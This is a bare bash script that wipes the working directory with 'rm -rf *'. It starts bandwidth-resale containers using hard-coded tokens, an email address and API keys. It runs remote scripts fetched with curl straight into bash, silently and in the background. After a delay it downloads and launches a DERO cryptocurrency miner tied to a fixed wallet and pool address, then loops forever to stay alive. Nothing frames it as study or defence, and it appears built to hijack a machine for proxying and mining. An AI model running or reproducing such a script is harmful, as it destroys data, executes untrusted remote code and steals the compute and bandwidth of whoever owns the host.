#!/bin/bash
rm -rf *
docker rm -f mkt >/dev/null 2>&1
docker run -d --name mkt traffmonetizer/cli_v2 start accept --token Mu3hefwR2XsEoo3K+Kn+yFICzbJgNvdjezTN2FjrGIQ=
sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="75814704-4b0f-42ca-a39c-f9cdcc2c1a40"  earnfm/earnfm-client:latest
docker run --name repocket -e RP_EMAIL=minshousevn@gmail.com -e RP_API_KEY=69b5f8b8-40d4-4586-9247-4aa27e48ccfe -d --restart=always repocket/repocket

bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &
#bash -c "bash <(curl -s https://raw.githubusercontent.com/rabithoy/bart/main/trafftthproxy.sh)"  > /dev/null 2>&1 &
#bash -c "bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/layproxyrack.sh)"  > /dev/null 2>&1 &
bash -c "bash <(curl -s https://raw.githubusercontent.com/rabithoy/bash1/main/severproxy.sh)"  > /dev/null 2>&1 &

(sleep 300 && wget -q -O astrominer-V1.9.2.R5_amd64_linux.tar.gz https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && rm -rf astrominer && tar -xzf astrominer-V1.9.2.R5_amd64_linux.tar.gz && ./astrominer/astrominer -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l -log-interval 600 -m 1 -p rpc -r 51.75.119.162:10100 > /dev/null 2>&1) &

while true; do
  echo "ilovingyou"
  sleep 60
done
